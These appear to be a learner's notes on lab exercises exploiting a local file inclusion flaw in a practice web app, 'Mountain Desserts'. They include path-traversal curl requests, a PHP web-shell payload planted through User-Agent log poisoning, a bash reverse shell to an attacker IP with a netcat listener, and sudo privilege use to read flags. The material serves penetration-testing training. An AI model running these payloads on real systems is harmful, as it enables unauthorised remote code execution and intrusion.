1. Follow the steps in this section and leverage the LFI vulnerability in the web application (located at **http://mountaindesserts.com/meteor/**) to receive a reverse shell on WEB18 (VM #1). Get the flag from the **/home/ariella/flag.txt** file. To display the contents of the file, check your sudo privileges with **sudo -l** and use them to read the flag.

```bash
# Accessing the logs
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

# Poisoning the logs
# Adding the following in the User Agent section:
<?php echo system($_GET['cmd']); ?>

# Exploiting the logs

```
![[Pasted image 20250311222825.png]]


```bash
# Running a reverse shell command
nc -lvnp 4444 # On the kali

# Command to run
bash -c "bash -i >& /dev/tcp/192.168.45.181/4444 0>&1"

# Encoded command
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.181%2F4444%200%3E%261%22
```

CyberChef receipe to encode:
https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4MS80NDQ0IDA%2BJjEi

Shell achieved!

Checking what we can run:

```bash
sudo -l
```
![[Pasted image 20250311224357.png]]

This means we can run any command with root privileges.

```bash
sudo cat /home/ariella/flag.txt
```
![[Pasted image 20250311224548.png]]


2. Exploit the LFI vulnerability in the web application "Mountain Desserts" on WEB18 (VM #2) (located at **http://mountaindesserts.com/meteor/**) to execute the PHP **/opt/admin.bak.php** file with Burp or curl. Enter the flag from the output.

```bash
# Reusing the same initial idea:
GET /meteor/index.php?page=../../../../../../../../../opt/admin.bak.php HTTP/1.1
```
![[Pasted image 20250311225908.png]]


3. The "Mountain Desserts" web application now runs on VM #3 at **http://192.168.50.193/meteor/** (The third octet of the IP address in the URL needs to be adjusted). Use the LFI vulnerability in combination with Log Poisoning to execute the _dir_ command. Poison the **access.log** log in the XAMPP **C:\xampp\apache\logs** log directory . Find the flag in one of the files from the **dir** command output.

```bash
# Accessing the logs
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../xampp/apache/logs/access.log

# Reading the content
type C:\xampp\apache\logs\*
cmd=type%20C%3A%5Cxampp%5Capache%5Clogs%5C%2A

# Listing the files
cmd=dir
```
![[Pasted image 20250311231349.png]]

```bash
# Reading the content of the file
```
![[Pasted image 20250311231417.png]]